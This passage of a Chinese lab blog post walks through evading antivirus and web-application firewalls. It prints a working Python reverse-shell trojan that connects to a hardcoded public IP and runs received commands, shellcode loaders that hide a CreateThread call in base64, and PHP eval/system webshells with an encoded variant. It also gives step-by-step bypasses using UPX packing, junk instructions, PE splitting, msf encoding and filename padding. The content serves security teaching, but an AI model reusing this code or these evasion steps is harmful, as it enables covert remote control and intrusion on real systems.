class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">print(&quot;开始检测&quot;)</span><br><span class="line">while(1):</span><br><span class="line"></span><br><span class="line">    # 获取目标文件夹的路径</span><br><span class="line">    filedir &#x3D; os.getcwd()</span><br><span class="line">    # 获取当前文件夹中的文件名称列表</span><br><span class="line">    filenames &#x3D; os.listdir(filedir)</span><br><span class="line">    for filename in filenames:</span><br><span class="line">        if (filename!&#x3D;&#39;test.py&#39; and filename!&#x3D;&#39;upload_file.php&#39; and filename!&#x3D;&#39;index.html&#39; and filename!&#x3D;&#39;nginx.htaccess&#39; and filename!&#x3D;&#39;.htaccess&#39;):</span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            a &#x3D; e.read(6997712)</span><br><span class="line">            e.close()</span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            b &#x3D; e.read(2048)</span><br><span class="line">            e.close()</span><br><span class="line">            #print(b)</span><br><span class="line">            sear &#x3D; re.search(rb&#39;\x65\x2e\x68\x13\xda\x69\xf9\x54\xea\xc1\xbc\x42\x11\xa6\x8a\xf9\xfc\x4b\xe5\x52\x71\xc1\xcd\x13\x32\xe5\x8c\x93\x93\x87\x79\xc7\x85\x8b\x89\x98\x7c\x69\xa6\xe5\xe7\x41\x0f\x8b\x24\x40\x89\xc3\xad&#39;,a)</span><br><span class="line">            sear1 &#x3D;re.search(rb&#39;\x48\x89\x5c\x24\x08\x57\x48\x83\xec\x20\x8b\xf9\xe8\x37\xab\x00\x00\x48\x8b\x18\xe8\x27\xab\x00\x00\x48\x8b\xd3\x8b\x08\xe8\x9d\x53\x00\x00\x48\x8b\xd0\x8b\xcf\x48\x8b\x5c\x24\x30\x48\x83\xc4\x20\x5f\xe9\xd9\x17\x00\x00\xcc&#39;,b)</span><br><span class="line"></span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            c&#x3D;e.read()</span><br><span class="line">            e.close()</span><br><span class="line">            sear2 &#x3D; re.search(rb&#39;\xF6\x8B\xEC\x81\x0B\x0C\x04\x00\x00\xB8\xD7\x02\x4F\x00\x4E\x56\xA3\xE8\x17\x41\x00\xA3\xA8\x0B\x41\x00\xA3\x44\xD7\x47\x00\xA3\xC7\xB1\x41\x00\x33\xDB\x88\x48\xFB\x41\x00\x57\x8D\x45\xE1\x53\x8D\x4D\x08\x50\x51\xC7\x05\xF0\x17\x41\x00\x44\xD2\x40\x00\x88\x1D\x18\x3C\x41\x00\xE8\xD6\x4C\x00\x00\x68\xE0\x5F\x40\x9E\x2B\xD8\xA4\x00\x00\x83\xC4\x04\xCC\x53\x53\x68\x42\x40\x41\x00\xE8\x3D\x3E\x00\x15\x8B\x55\x0C\x8B\x45\x08&#39;,c)</span><br><span class="line"></span><br><span class="line">            #print(sear)</span><br><span class="line">            #print(sear1)</span><br><span class="line">            #print(filename)</span><br><span class="line">            if (((sear !&#x3D; None) and (sear1 !&#x3D;None)) or sear2 !&#x3D;None):</span><br><span class="line">                print(&quot;已删除文件&quot;+filename)</span><br><span class="line">                os.remove(filename)</span><br><span class="line">            else:</span><br><span class="line">                if(re.search(&#39;.exe&#39;,filename)):</span><br><span class="line">                    print(&quot;开始运行程序&quot;)</span><br><span class="line">                    #val&#x3D;os.popen(filename)</span><br><span class="line">                if(filename&#x3D;&#x3D;&#39;peloader.py&#39;):</span><br><span class="line">                    print(&quot;开始运行程序&quot;)</span><br><span class="line">                    val&#x3D;os.popen(&quot;python &quot;+filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    time.sleep(10)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>此脚本主要模拟了“特征码检测”的方法，为了确定特征码的有效性，提取地点为程序的text节，为了防止误报，部分程序提取了两个部分的特征码。才用每十秒检测一次的形式，如果被检测出病毒，脚本会自动删除文件；如果检测为“安全”，脚本会模拟人为操作“运行文件”。然后我上传了一个没有病毒的main.exe文件，并未被检测出来，并成功运行。</p>
-
-
-<h4 id="3-2在操作机上上访问-http-192-168-43-106-8082"><a href="#3-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="3.2在操作机上上访问 http://192.168.43.106:8082/"></a>3.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
-
-<h4 id="3-3在操作机上传client1-exe文件"><a href="#3-3在操作机上传client1-exe文件" class="headerlink" title="3.3在操作机上传client1.exe文件"></a>3.3在操作机上传client1.exe文件</h4>
-<p>&emsp;&emsp;client1.exe是由python脚本用pyinstaller转化而来的远程rce木马，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># 文件名：client.py</span><br><span class="line"></span><br><span class="line"># 导入 socket、sys 模块</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 创建 socket 对象</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"># 获取本地主机名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 设置端口号</span><br><span class="line">port &#x3D; 9999</span><br><span class="line"></span><br><span class="line"># 连接服务，指定主机和端口</span><br><span class="line">s.connect((&quot;110.40.245.122&quot;, port))</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    # 接收小于 1024 字节的数据</span><br><span class="line">    msg &#x3D; s.recv(1024)</span><br><span class="line">    val&#x3D;os.popen(msg.decode(&#39;utf-8&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #print (msg.decode(&#39;utf-8&#39;))</span><br><span class="line">    #print(val)</span><br><span class="line">    #print(type(val))</span><br><span class="line">    #val&#x3D;str(val)</span><br><span class="line">    #print(type(val))</span><br><span class="line">    for temp in val.readlines():</span><br><span class="line">        #print(temp)</span><br><span class="line">        s.send(temp.encode(&#39;utf-8&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(msg&#x3D;&#x3D;&#39;exit&#39;):</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
-<p>这个脚本的作用是远程RCE，即运行后向固定ip（操作机，因为家用机的ip会改变，所以我使用了服务器）发送连接请求，连接成功后接收对方的字符串并以指令方式执行，然后回传给操作机。<br>下图为病毒在virustotal的检测情况，可以看到本身绕过了360，腾讯，火绒，Microsoft等比较出名的杀毒检测。从这里我们可以得出：自己写的病毒很难被检测，现行的杀毒软件大部分还是针对市面上比较常见的病毒生成器和造成大规模伤害的病毒。<br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/d1e1ef77e50b85dc38ec1c0af18f669a6f832866f00bceed94b0cd8b78e2a46e">https://www.virustotal.com/gui/file/d1e1ef77e50b85dc38ec1c0af18f669a6f832866f00bceed94b0cd8b78e2a46e</a></p>
-
-
-<h4 id="3-4靶机脚本检测出木马，删除此文件"><a href="#3-4靶机脚本检测出木马，删除此文件" class="headerlink" title="3.4靶机脚本检测出木马，删除此文件"></a>3.4靶机脚本检测出木马，删除此文件</h4>
-
-<h4 id="3-5在操作机再次上传经过upx加壳后的client2-exe文件，靶机脚本未检测出木马，并运行"><a href="#3-5在操作机再次上传经过upx加壳后的client2-exe文件，靶机脚本未检测出木马，并运行" class="headerlink" title="3.5在操作机再次上传经过upx加壳后的client2.exe文件，靶机脚本未检测出木马，并运行"></a>3.5在操作机再次上传经过upx加壳后的client2.exe文件，靶机脚本未检测出木马，并运行</h4>
-
-<h4 id="3-6centos操作机监听并运行指令"><a href="#3-6centos操作机监听并运行指令" class="headerlink" title="3.6centos操作机监听并运行指令"></a>3.6centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息</p>
-
-
-<h3 id="4-花指令绕过实验"><a href="#4-花指令绕过实验" class="headerlink" title="4.花指令绕过实验"></a>4.花指令绕过实验</h3><h4 id="4-1开启模拟病毒检测脚本"><a href="#4-1开启模拟病毒检测脚本" class="headerlink" title="4.1开启模拟病毒检测脚本"></a>4.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py</p>
-
-
-<h4 id="4-2在操作机上上访问-http-192-168-43-106-8082"><a href="#4-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="4.2在操作机上上访问 http://192.168.43.106:8082/"></a>4.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
-
-<h4 id="4-3在操作机上传client1-exe文件"><a href="#4-3在操作机上传client1-exe文件" class="headerlink" title="4.3在操作机上传client1.exe文件"></a>4.3在操作机上传client1.exe文件</h4>
-
-<h4 id="4-4靶机脚本检测出木马，删除此文件"><a href="#4-4靶机脚本检测出木马，删除此文件" class="headerlink" title="4.4靶机脚本检测出木马，删除此文件"></a>4.4靶机脚本检测出木马，删除此文件</h4>
-
-<h4 id="4-5用x64dbj加入垃圾指令"><a href="#4-5用x64dbj加入垃圾指令" class="headerlink" title="4.5用x64dbj加入垃圾指令"></a>4.5用x64dbj加入垃圾指令</h4><p>&emsp;&emsp;例：由下图一加工成图二</p>
-
-
-<h4 id="4-6在操作机再次上传经过x64dbj花指令加工的client11-exe文件，靶机脚本未检测出木马，并运行"><a href="#4-6在操作机再次上传经过x64dbj花指令加工的client11-exe文件，靶机脚本未检测出木马，并运行" class="headerlink" title="4.6在操作机再次上传经过x64dbj花指令加工的client11.exe文件，靶机脚本未检测出木马，并运行"></a>4.6在操作机再次上传经过x64dbj花指令加工的client11.exe文件，靶机脚本未检测出木马，并运行</h4>
-
-<h4 id="4-7centos操作机监听并运行指令"><a href="#4-7centos操作机监听并运行指令" class="headerlink" title="4.7centos操作机监听并运行指令"></a>4.7centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息</p>
-
-
-<h3 id="5-拆分PE绕过实验"><a href="#5-拆分PE绕过实验" class="headerlink" title="5.拆分PE绕过实验"></a>5.拆分PE绕过实验</h3><h4 id="5-1开启模拟病毒检测脚本"><a href="#5-1开启模拟病毒检测脚本" class="headerlink" title="5.1开启模拟病毒检测脚本"></a>5.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py</p>
-
-
-<h4 id="5-2在操作机上上访问-http-192-168-43-106-8082"><a href="#5-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="5.2在操作机上上访问 http://192.168.43.106:8082/"></a>5.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
-
-<h4 id="5-3在操作机上传client1-exe文件"><a href="#5-3在操作机上传client1-exe文件" class="headerlink" title="5.3在操作机上传client1.exe文件"></a>5.3在操作机上传client1.exe文件</h4>
-
-<h4 id="5-4靶机脚本检测出木马，删除此文件"><a href="#5-4靶机脚本检测出木马，删除此文件" class="headerlink" title="5.4靶机脚本检测出木马，删除此文件"></a>5.4靶机脚本检测出木马，删除此文件</h4>
-
-<h4 id="5-5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行"><a href="#5-5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行" class="headerlink" title="5.5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行"></a>5.5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行</h4><p>&emsp;&emsp;用pyinstaller拆分的文件</p>
-
-
-<p>&emsp;&emsp;上传</p>
-
-
-<h4 id="5-6centos操作机监听并运行指令"><a href="#5-6centos操作机监听并运行指令" class="headerlink" title="5.6centos操作机监听并运行指令"></a>5.6centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息</p>
-
-
-<h3 id="6-加载器绕过"><a href="#6-加载器绕过" class="headerlink" title="6.加载器绕过"></a>6.加载器绕过</h3><h4 id="6-1编写loader"><a href="#6-1编写loader" class="headerlink" title="6.1编写loader"></a>6.1编写loader</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import ctypes      &#x2F;&#x2F;数据类型转换</span><br><span class="line">import requests    &#x2F;&#x2F; 如果将shellcode放在外网上则使用request访问</span><br><span class="line">import base64     &#x2F;&#x2F;base64实现解码</span><br><span class="line">import binascii  &#x2F;&#x2F;数据类型转换</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file &#x3D; open(&#39;.&#x2F;test.txt&#39;)</span><br><span class="line">scode &#x3D; file.read()</span><br><span class="line">scode &#x3D; bytes(scode,encoding &#x3D; &#39;utf-8&#39;)</span><br><span class="line">shellcode &#x3D; bytearray(scode)   &#x2F;&#x2F;打开文件读取并转化数据类型</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64 &#x2F;&#x2F;定义数据类型</span><br><span class="line"></span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40)) &#x2F;&#x2F;调用进程的虚地址空间，设定入口地址</span><br><span class="line"></span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode) &#x2F;&#x2F;读取内存</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)&#x2F;&#x2F;复制移动内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string &#x3D; &#39;&#39;&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQop&#39;&#39;&#39; &#x2F;&#x2F;是ctypes.windll.kernel32.CreateThread的base64形式，由于会报毒所以编码</span><br><span class="line">handle &#x3D; base64.b64decode(string)</span><br><span class="line">handle &#x3D; int.from_bytes(handle,&#39;big&#39;) </span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                                        ctypes.c_int(handle),</span><br><span class="line">                                        ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
-
-<h4 id="6-2生成shellcode"><a href="#6-2生成shellcode" class="headerlink" title="6.2生成shellcode"></a>6.2生成shellcode</h4>
-
-<h4 id="6-3填充shellcode"><a href="#6-3填充shellcode" class="headerlink" title="6.3填充shellcode"></a>6.3填充shellcode</h4>
-
-<h4 id="6-4运行加载器并查看结果"><a href="#6-4运行加载器并查看结果" class="headerlink" title="6.4运行加载器并查看结果"></a>6.4运行加载器并查看结果</h4><p>python loader.py</p>
-
-
-<h3 id="7-二分PE"><a href="#7-二分PE" class="headerlink" title="7.二分PE"></a>7.二分PE</h3><h4 id="7-1利用加载器原理编写peloader"><a href="#7-1利用加载器原理编写peloader" class="headerlink" title="7.1利用加载器原理编写peloader"></a>7.1利用加载器原理编写peloader</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import ctypes      &#x2F;&#x2F;数据类型转换</span><br><span class="line">import requests    &#x2F;&#x2F; 如果将shellcode放在外网上则使用request访问</span><br><span class="line">import base64     &#x2F;&#x2F;base64实现解码</span><br><span class="line">import binascii  &#x2F;&#x2F;数据类型转换</span><br><span class="line"></span><br><span class="line">file &#x3D; open(&#39;.&#x2F;payload.bin&#39;,&#39;rb&#39;)</span><br><span class="line">scode &#x3D; file.read()    &#x2F;&#x2F;打开文件读取</span><br><span class="line">shellcode &#x3D; bytearray(binascii.b2a_hex(scode)) &#x2F;&#x2F;转成byte</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64  &#x2F;&#x2F;定义数据类型</span><br><span class="line"></span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))  &#x2F;&#x2F;调用进程的虚地址空间，设定入口地址</span><br><span class="line"></span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode) &#x2F;&#x2F;读取内存</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)  &#x2F;&#x2F;复制内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string &#x3D; &#39;&#39;&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQop&#39;&#39;&#39; &#x2F;&#x2F;是ctypes.windll.kernel32.CreateThread的base64形式，由于会报毒所以编码（报毒定位通过分离文件查找）</span><br><span class="line">handle &#x3D; base64.b64decode(string)</span><br><span class="line">handle &#x3D; int.from_bytes(handle,&#39;big&#39;)</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                                        ctypes.c_int(handle),</span><br><span class="line">                                        ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
-
-<h4 id="7-2生成bin文件"><a href="#7-2生成bin文件" class="headerlink" title="7.2生成bin文件"></a>7.2生成bin文件</h4>
-
-<h4 id="7-3将payload-bin移到对应路径"><a href="#7-3将payload-bin移到对应路径" class="headerlink" title="7.3将payload.bin移到对应路径"></a>7.3将payload.bin移到对应路径</h4>
-
-<h4 id="7-4运行加载器并观察结果"><a href="#7-4运行加载器并观察结果" class="headerlink" title="7.4运行加载器并观察结果"></a>7.4运行加载器并观察结果</h4><p>python peloader.py</p>
-
-
-<h3 id="8-混淆绕过"><a href="#8-混淆绕过" class="headerlink" title="8.混淆绕过"></a>8.混淆绕过</h3><h4 id="8-1开启模拟病毒检测脚本"><a href="#8-1开启模拟病毒检测脚本" class="headerlink" title="8.1开启模拟病毒检测脚本"></a>8.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br>（具体脚本信息请参考README.md或加壳.md）</p>
-
-
-<h4 id="8-2在操作机上上访问-http-192-168-43-106-8082"><a href="#8-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="8.2在操作机上上访问 http://192.168.43.106:8082/"></a>8.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
-
-<h4 id="8-3在操作机上传msf4-exe文件"><a href="#8-3在操作机上传msf4-exe文件" class="headerlink" title="8.3在操作机上传msf4.exe文件"></a>8.3在操作机上传msf4.exe文件</h4>
-
-<h4 id="8-4靶机脚本检测出木马，删除此文件"><a href="#8-4靶机脚本检测出木马，删除此文件" class="headerlink" title="8.4靶机脚本检测出木马，删除此文件"></a>8.4靶机脚本检测出木马，删除此文件</h4>
-
-<h4 id="8-5在操作机再次上传经过encode混淆后的msf5-exe文件，未检测出木马，开始运行"><a href="#8-5在操作机再次上传经过encode混淆后的msf5-exe文件，未检测出木马，开始运行" class="headerlink" title="8.5在操作机再次上传经过encode混淆后的msf5.exe文件，未检测出木马，开始运行"></a>8.5在操作机再次上传经过encode混淆后的msf5.exe文件，未检测出木马，开始运行</h4>
-
-<h4 id="8-6centos操作机监听并运行指令"><a href="#8-6centos操作机监听并运行指令" class="headerlink" title="8.6centos操作机监听并运行指令"></a>8.6centos操作机监听并运行指令</h4><p>在kali操作机上用msf监听4444端口，发现建立连接，使用getdesktop指令，发现可以获取靶机信息</p>
-
-
-<h3 id="9-垃圾字符绕过"><a href="#9-垃圾字符绕过" class="headerlink" title="9.垃圾字符绕过"></a>9.垃圾字符绕过</h3><h4 id="9-1在操作机上上访问-http-192-168-43-106-8083"><a href="#9-1在操作机上上访问-http-192-168-43-106-8083" class="headerlink" title="9.1在操作机上上访问 http://192.168.43.106:8083/"></a>9.1在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8083/">http://192.168.43.106:8083/</a></h4>
-
-<h4 id="9-2编写php木马文件hack-php-内容如下-并上传，被waf拦截"><a href="#9-2编写php木马文件hack-php-内容如下-并上传，被waf拦截" class="headerlink" title="9.2编写php木马文件hack.php,内容如下,并上传，被waf拦截"></a>9.2编写php木马文件hack.php,内容如下,并上传，被waf拦截</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="9-3用burpsuit抓包，并加入垃圾字符"><a href="#9-3用burpsuit抓包，并加入垃圾字符" class="headerlink" title="9.3用burpsuit抓包，并加入垃圾字符"></a>9.3用burpsuit抓包，并加入垃圾字符</h4><p>下图一为原数据包，图二为改后数据包（在文件名前添加966位垃圾字符，使文件名长度为974位）</p>
-
-
-<h4 id="9-4显示上传成功"><a href="#9-4显示上传成功" class="headerlink" title="9.4显示上传成功"></a>9.4显示上传成功</h4>
-
-<h4 id="9-5用蚁剑连接成功"><a href="#9-5用蚁剑连接成功" class="headerlink" title="9.5用蚁剑连接成功"></a>9.5用蚁剑连接成功</h4>
-
-<h3 id="10-编码绕过"><a href="#10-编码绕过" class="headerlink" title="10.编码绕过"></a>10.编码绕过</h3><h4 id="10-1在操作机上上访问-http-192-168-43-106-8082"><a href="#10-1在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="10.1在操作机上上访问 http://192.168.43.106:8082/"></a>10.1在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
-<h4 id="10-2在操作机上传一句话木马hack-php"><a href="#10-2在操作机上传一句话木马hack-php" class="headerlink" title="10.2在操作机上传一句话木马hack.php"></a>10.2在操作机上传一句话木马hack.php</h4><p>&emsp;&emsp;内容为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="10-3被检测删除"><a href="#10-3被检测删除" class="headerlink" title="10.3被检测删除"></a>10.3被检测删除</h4>
-
-<h4 id="10-4上传编码后的一句话木马"><a href="#10-4上传编码后的一句话木马" class="headerlink" title="10.4上传编码后的一句话木马"></a>10.4上传编码后的一句话木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);@$a($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="10-5用蚁剑连接成功"><a href="#10-5用蚁剑连接成功" class="headerlink" title="10.5用蚁剑连接成功"></a>10.5用蚁剑连接成功</h4>
-
-<h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>通过本实验的学习，要求学员学会使用sigthief伪造签名以及了解签名的机制与作用，加载器的编写和使用msf构造shellcode，编写加载器，通过分离文件代码找到特征码并修改，利用donut将exe转换为bin，学习编写简单的木马检测脚本，能总结寻找木马特有的特征的方法，学会简单的加壳技术并通过文件对比来确定其差异，学习二进制知识进行花指令编写</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/28/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/">展开全文 >></a>
         </p>
       
 
